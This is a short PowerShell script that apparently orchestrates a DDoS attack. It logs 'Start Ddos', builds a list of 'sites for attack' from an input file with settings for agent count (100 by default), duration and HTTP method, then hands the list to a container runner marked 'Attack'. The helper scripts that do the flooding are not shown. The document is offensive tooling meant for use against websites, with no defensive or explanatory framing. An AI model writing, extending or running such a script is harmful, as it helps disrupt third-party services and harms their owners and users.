param(
    [Alias('Source')][string] $LinesPath = "./lines.txt",
    [int] $AgentCount = 100,
    [string] $ExecutionTime = "60s",
    [string] $HttpMethod = 'http1',
    [int] $FinishTimeout = 100
)

.\Log "==== Start Ddos ===="

$TargetUrlsPath = "./urls.txt"

if (Test-Path $TargetUrlsPath) {
    .\Log -s 'ParseLine' "Remove old urls file: $TargetUrlsPath"
    Remove-Item $TargetUrlsPath
}

# Get list of sites for attack
.\PingSites -Source $LinesPath -Destination $TargetUrlsPath $AgentCount $ExecutionTime $HttpMethod $FinishTimeout

# Attack
.\run_container $TargetUrlsPath

.\Log "==== Finish Ddos ===="